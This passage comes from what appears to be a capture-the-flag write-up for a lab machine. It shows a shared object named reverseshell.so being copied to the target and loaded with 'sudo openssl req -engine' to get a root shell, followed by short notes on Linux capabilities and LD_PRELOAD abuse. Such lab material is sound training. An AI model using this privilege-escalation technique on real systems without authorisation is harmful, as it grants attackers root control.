reverseshell.c:6:5: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
    6 |     setuid(0);
      | 
```

`scp reverseshell.so production@koth.thm:~/reverseshell.so`

```bash
reverseshell.so                               100%   14KB  13.5MB/s   00:00
```

```bash
production@gibson:~$ ls -lsa
total 60
 4 drwxr-x--- 7 production production  4096 Jan 13 12:30 .
 4 drwxr-xr-x 6 root       root        4096 Apr 29  2020 ..
 0 lrwxrwxrwx 1 production production     9 Apr 30  2020 .bash_history -> /dev/null
 4 -rw-r--r-- 1 production production   220 Apr 29  2020 .bash_logout
 4 -rw-r--r-- 1 production production  3771 Apr 29  2020 .bashrc
 4 drwx------ 2 production production  4096 Apr 29  2020 .cache
 4 -r-------- 1 production production    38 Apr 30  2020 .flag
 4 drwx------ 3 production production  4096 Apr 29  2020 .gnupg
 4 drwxrwxr-x 3 production production  4096 Apr 30  2020 .local
 4 -rw-r--r-- 1 production production   807 Apr 29  2020 .profile
16 -rwxr-xr-x 1 production production 14104 Jan 13 12:30 reverseshell.so
 4 drwx------ 2 production production  4096 Jan 13 12:17 .ssh
 4 drwxr-xr-x 3 production production  4096 May  7  2020 webserver
 
production@gibson:~$ sudo openssl req -engine ./reverseshell.so
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
# 

```

# Appendix

## Capabilities

<aside>
💡

Capabilities in Linux provide a fine-grained method of granting specific privileges to processes without giving them full superuser (root) rights. They are part of the security features implemented in modern Linux systems to reduce the risks associated with running processes as root.

</aside>

## LD_PRELOAD

<aside>
💡

LD_PRELOAD is an environment variable used in Linux to specify shared libraries that should be loaded before any other library. It allows you to override or extend the functionality of existing functions in dynamically linked libraries. If the sudoers configuration includes the env_keep option or permits LD_PRELOAD to persist, it creates a risk. Malicious code injected via LD_PRELOAD could be executed with elevated privileges.

</aside>

##